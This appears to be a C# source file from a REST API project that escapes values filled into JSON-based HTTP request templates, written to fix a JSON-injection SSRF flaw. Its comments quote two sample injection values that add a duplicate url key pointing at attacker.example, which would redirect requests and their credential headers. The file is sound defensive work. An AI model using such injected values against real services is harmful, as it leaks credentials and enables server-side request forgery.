using System.Globalization;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace DBToRestAPI.Services.HttpExecutor.Internal;

/// <summary>
/// Decides how a value must be encoded when it is substituted into a
/// <c>{http{ ... }http}</c> block.
///
/// WHY THIS EXISTS
/// ---------------
/// An embedded HTTP block is a JSON document held as TEXT, and markers are filled into that
/// text before it is parsed. Nothing escaped the substituted value, so a value containing a
/// double quote closed the JSON string it sat in and could append sibling keys. Because
/// <c>System.Text.Json</c> returns the LAST duplicate key, a value such as
/// <code>a","url":"https://attacker.example</code>
/// substituted into
/// <code>"url": "https://internal/api?x={{p}}"</code>
/// replaced the destination entirely - an arbitrary-host SSRF that also handed the block's
/// own credential headers (an API key, a bearer token) to the attacker's server.
///
/// WHY NOT SIMPLY ESCAPE EVERYTHING
/// --------------------------------
/// A marker is also allowed to sit OUTSIDE a string, where it injects a whole JSON document
/// on purpose - <c>"body": {{body_add}}</c> is a supported and used pattern. Escaping that
/// would turn a valid object into the broken literal <c>{\"a\":1}</c>. So the encoding has to
/// depend on WHERE the marker sits, which is what <see cref="ClassifyMarkers"/> works out.
/// <see cref="ConvertValue"/> then encodes each value: a marker used only outside strings
/// gets exactly one JSON value (<see cref="ToStructuralJson"/>), and every other marker is
/// escaped so it can't change the structure wherever it lands (<see cref="JsonEscapeForAnyPosition"/>).
/// </summary>
internal static class EmbeddedHttpTemplate
{
    /// <summary>
    /// Matches both <c>{{name}}</c> and prefixed markers such as <c>{settings{name}}</c>. Used
    /// when no patterns are given; the engine passes the patterns it fills the block with.
    /// </summary>
    private static readonly Regex MarkerPattern =
        new(@"\{\w*\{(?<param>.*?)\}\}", RegexOptions.Compiled | RegexOptions.Singleline);

    /// <summary>
    /// The block parser's leniency (JsonRequestParser): comments skipped, trailing commas allowed.
    /// </summary>
    private static readonly JsonDocumentOptions LenientOptions = new()
    {
        CommentHandling = JsonCommentHandling.Skip,
        AllowTrailingCommas = true,
    };

    /// <summary>
    /// The output goes into a JSON document that is parsed again, never into HTML, so only
    /// what JSON itself requires is escaped.
    /// </summary>
    private static readonly JsonSerializerOptions CanonicalOptions = new()
    {
        Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping,
    };

    /// <summary>
    /// Where each marker name is used in a block: inside a JSON string, outside one, or both.
    /// Names are compared ignoring case, as the fill looks them up.
    /// </summary>
    internal sealed class MarkerContexts
    {
        public HashSet<string> InsideString { get; } = new(StringComparer.OrdinalIgnoreCase);
        public HashSet<string> Structural { get; } = new(StringComparer.OrdinalIgnoreCase);

        /// <summary>Names used both inside and outside a string.</summary>
        public HashSet<string> Mixed
        {
            get
            {
                var mixed = new HashSet<string>(InsideString, StringComparer.OrdinalIgnoreCase);
                mixed.IntersectWith(Structural);
                return mixed;
            }
        }

        /// <summary>
        /// True only for a name used outside strings and nowhere else. A name that is also
        /// used inside a string, sits only in a comment, or isn't in the block at all is not.
        /// </summary>
        public bool IsStructuralOnly(string name)
            => Structural.Contains(name) && !InsideString.Contains(name);
    }

    /// <summary>
    /// Works out where each marker in a block sits.
    /// </summary>
    /// <param name="template">The inner text of a <c>{http{ ... }http}</c> block.</param>
    /// <param name="markerPatterns">
    /// The regular expressions the block will be filled with (each with a <c>param</c> group).
    /// They can be overridden per route or globally (<c>json_variables_pattern</c> and the
    /// others), so the defaults alone would miss a marker such as <c>||id||</c>. When null,
    /// <c>{{name}}</c> and <c>{prefix{name}}</c> markers are found.
    /// </param>
    /// <remarks>
    /// A marker inside a JSON comment is in neither set, so it is escaped like an in-string one.
    /// So is a marker that only appears once an earlier value has been inserted, because the
    /// fill re-scans the text after each pattern.
    /// </remarks>
    public static MarkerContexts ClassifyMarkers(string template, IEnumerable<string>? markerPatterns = null)
    {
        var result = new MarkerContexts();
        if (string.IsNullOrEmpty(template))
            return result;

        // Every marker any pattern finds, by where it starts.
        var markers = new Dictionary<int, MarkerSpan>();
        IEnumerable<MatchCollection> matchSets = markerPatterns is null
            ? new[] { MarkerPattern.Matches(template) }
            : markerPatterns
                .Where(p => !string.IsNullOrEmpty(p))
                .Distinct(StringComparer.Ordinal)
                .Select(p => Regex.Matches(template, p)); // no options: the fill uses none either
        foreach (var matches in matchSets)
        {
            foreach (Match match in matches)
            {
                var name = match.Groups["param"].Value;
                if (match.Length == 0 || string.IsNullOrEmpty(name))
                    continue;
                if (!markers.TryGetValue(match.Index, out var span))
                    markers[match.Index] = span = new MarkerSpan();
                span.End = Math.Max(span.End, match.Index + match.Length);
                span.Names.Add(name);
            }
        }

        var inString = false;
        for (var i = 0; i < template.Length; i++)
        {
            if (markers.TryGetValue(i, out var marker))
            {
                var set = inString ? result.InsideString : result.Structural;
                foreach (var name in marker.Names)
                {
                    set.Add(name);
                    var trimmed = name.Trim();
                    if (trimmed.Length > 0)
                        set.Add(trimmed);
                }
                // Skip the marker body, so a slash or quote in a name (a claim type such as
                // {auth{http://...}}) can't be read as a comment or the end of a string. A
                // marker starting inside another one's body is never visited.
                i = marker.End - 1;
                continue;
            }

            var c = template[i];

            if (inString)
            {
                // A backslash escapes the next character, so it cannot end the string.
                if (c == '\\') { i++; continue; }
                if (c == '"') inString = false;
                continue;
            }

            if (c == '"')
            {
                inString = true;
                continue;
            }

            // The request parser accepts JSON comments (JsonCommentHandling.Skip), so a
            // quote inside one must not toggle string state. Only checked OUTSIDE a
            // string, which is also what keeps the "//" in https:// from matching.
            if (c == '/' && i + 1 < template.Length)
            {
                if (template[i + 1] == '/')
                {
                    var eol = template.IndexOf('\n', i);
                    if (eol < 0) break;
                    i = eol;
                    continue;
                }
                if (template[i + 1] == '*')
                {
                    var end = template.IndexOf("*/", i + 2, StringComparison.Ordinal);
                    if (end < 0) break;
                    i = end + 1;
                    continue;
                }
            }
        }

        return result;
    }

    private sealed class MarkerSpan
    {
        public int End;
        public List<string> Names { get; } = [];
    }

    /// <summary>
    /// Returns the marker names whose value would land INSIDE a JSON string literal, found
    /// with the default <c>{{name}}</c> and <c>{prefix{name}}</c> patterns.
    /// </summary>
    /// <param name="template">The inner text of a <c>{http{ ... }http}</c> block.</param>
    /// <param name="usedInBothContexts">Names that appear both inside and outside a string.</param>
    public static HashSet<string> MarkersInsideJsonStrings(
        string template,
        out HashSet<string> usedInBothContexts)
    {
        var contexts = ClassifyMarkers(template);
        usedInBothContexts = contexts.Mixed;
        return contexts.InsideString;
    }

    /// <summary>
    /// The text to substitute for a marker: one JSON value for a marker used only outside
    /// strings, and an escaped value that can't change the structure for every other marker.
    /// </summary>
    public static string ConvertValue(MarkerContexts contexts, string name, object? value)
        => contexts.IsStructuralOnly(name)
            ? ToStructuralJson(value)
            : JsonEscapeForAnyPosition(value?.ToString());

    /// <summary>
    /// Escapes a value so it cannot terminate the JSON string literal it is substituted into.
    /// Deliberately minimal: it changes only characters that are illegal or structural inside
    /// a JSON string, so any value that was already well-formed passes through untouched and
    /// no existing configuration changes behaviour.
    /// </summary>
    public static string JsonEscape(string? value)
    {
        if (string.IsNullOrEmpty(value))
            return string.Empty;

        var sb = new StringBuilder(value.Length + 16);
        foreach (var c in value)
        {
            switch (c)
            {
                case '"': sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\b': sb.Append("\\b"); break;
                case '\f': sb.Append("\\f"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                default:
                    if (c < ' ')
                        sb.Append("\\u").Append(((int)c).ToString("x4"));
                    else
                        sb.Append(c);
                    break;
            }
        }

        return sb.ToString();
    }

    /// <summary>
    /// <see cref="JsonEscape"/>, plus <c>{ } [ ] , : / *</c> written as <c>\u</c> escapes.
    /// </summary>
    /// <remarks>
    /// For a marker that is not used only outside strings: one inside a string, one used both
    /// inside and outside (the fill gives every occurrence of a name the same text), one in a
    /// comment, or one that only appeared once an earlier value was inserted.
    /// Inside a JSON string the escapes decode to the same text, so the value arrives
    /// unchanged. Anywhere else they are not valid JSON, so the value can't close a container,
    /// start or end a comment, or add a key: a plain number, true, false or null still works
    /// there, and anything else makes the block fail to parse, which fails that one call.
    /// </remarks>
    public static string JsonEscapeForAnyPosition(string? value)
    {
        var escaped = JsonEscape(value);
        if (escaped.IndexOfAny(['{', '}', '[', ']', ',', ':', '/', '*']) < 0)
            return escaped;

        var sb = new StringBuilder(escaped.Length + 32);
        foreach (var c in escaped)
        {
            switch (c)
            {
                case '{': case '}': case '[': case ']': case ',': case ':': case '/': case '*':
                    sb.Append("\\u").Append(((int)c).ToString("x4"));
                    break;
                default:
                    sb.Append(c);
                    break;
            }
        }
        return sb.ToString();
    }

    /// <summary>
    /// Converts a value for a marker that sits only OUTSIDE JSON strings (<c>"body": {{payload}}</c>),
    /// where the text is inserted as JSON. The result is always exactly one JSON value, so it can
    /// never change the structure of the block around it.
    /// </summary>
    /// <remarks>
    /// Before 1.7.6, such a value was inserted as raw text. A previous query's NULL column (or
    /// zero or several rows) lets a request field with the same name fill the marker, so a
    /// caller could send <c>1, "url": "https://attacker.example"</c> and add a second url key.
    /// System.Text.Json keeps the LAST duplicate, so the call, with this block's credential
    /// headers, went to the caller's host.
    /// Now:
    /// - a bool becomes <c>true</c> or <c>false</c> (its .NET text, <c>True</c>, is not JSON);
    /// - a number uses the invariant culture, so a server whose culture writes <c>1,5</c> still
    ///   produces a JSON number;
    /// - text that is one JSON value to the block's own parser (which skips comments and allows
    ///   trailing commas) is written back as compact JSON, so the documented "inject a whole
    ///   JSON document" pattern keeps working and nothing but that one value is inserted;
    /// - anything else (several values, trailing text, an empty string, a date) is inserted as
    ///   a JSON string literal.
    /// </remarks>
    public static string ToStructuralJson(object? value)
    {
        if (value is null)
            return "null";
        if (value is bool b)
            return b ? "true" : "false";

        var text = Convert.ToString(value, CultureInfo.InvariantCulture) ?? string.Empty;
        return TryCanonicalJson(text, out var json)
            ? json
            : "\"" + JsonEscape(text) + "\"";
    }

    /// <summary>
    /// Parses the text as exactly one JSON value, as leniently as the block parser does, and
    /// returns it as compact JSON with no comments or trailing commas.
    /// </summary>
    public static bool TryCanonicalJson(string? text, out string json)
    {
        json = string.Empty;
        if (string.IsNullOrWhiteSpace(text))
            return false;
        try
        {
            using var document = JsonDocument.Parse(text, LenientOptions);
            json = JsonSerializer.Serialize(document.RootElement, CanonicalOptions);
            return true;
        }
        catch (JsonException)
        {
            return false;
        }
        catch (ArgumentException)
        {
            // Text that can't be transcoded to UTF-8 (an unpaired surrogate) is not JSON either.
            // Letting this escape would fail the whole request instead of this one value.
            return false;
        }
    }

    /// <summary>
    /// True if the value carries a carriage return or line feed, which must never reach an
    /// HTTP header. Headers are added with TryAddWithoutValidation, so nothing else stops it.
    /// </summary>
    public static bool ContainsHeaderBreak(string? value)
        => value is not null && (value.Contains('\r') || value.Contains('\n'));
}
